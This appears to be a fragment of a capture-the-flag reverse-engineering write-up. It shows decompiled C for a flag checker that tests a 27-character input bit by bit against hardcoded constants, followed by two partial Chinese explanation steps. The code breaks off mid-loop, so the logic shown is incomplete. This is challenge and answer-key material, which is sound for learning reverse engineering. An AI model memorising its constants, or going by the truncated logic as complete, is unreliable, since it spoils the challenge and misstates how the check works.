{
  __int64 idx_1; // rbx
  char v3[32]; // [rsp+10h] [rbp-50h]
  int v4; // [rsp+34h] [rbp-2Ch]
  int v5; // [rsp+38h] [rbp-28h]
  int v6; // [rsp+3Ch] [rbp-24h]
  int bit_idx_j; // [rsp+40h] [rbp-20h]
  unsigned int i; // [rsp+44h] [rbp-1Ch]
  int bit_idx; // [rsp+48h] [rbp-18h]
  int idx; // [rsp+4Ch] [rbp-14h]

  if ( strlen(flag) != 27 )
    return 1LL;
  *(_QWORD *)v3 = 0x617B2375F81EA7E1LL;
  *(_QWORD *)&v3[8] = 0xD269DF5B5AFC9DB9LL;
  *(_QWORD *)&v3[15] = 0xF467EDF4ED1BFED2LL;
  idx = 0;
  bit_idx = 0;
  v6 = 0;
  for ( i = 0; i <= 0x16; ++i )
  {
    for ( bit_idx_j = 0; bit_idx_j <= 7; ++bit_idx_j )
    {
      if ( !bit_idx )                           // 从第一个位开始
        bit_idx = 1;
      v5 = 1 << (7 - bit_idx_j);                // 从第0个位开始
      v4 = 1 << (7 - bit_idx);
      if ( (v5 & v3[i]) > 0 != (v4 & flag[idx]) > 0 )// 输入和v3循环右移1位的结果进行比较
        return 1LL;
      if ( ++bit_idx == 8 )                     // 8次一组

      {

        ++idx;                                  // idx是组数

2. 将flag的前23个字符（184位）与v3的循环右移1位对应位逐一比较。
3. 如果任何一位不匹配，返回失败（1LL）。
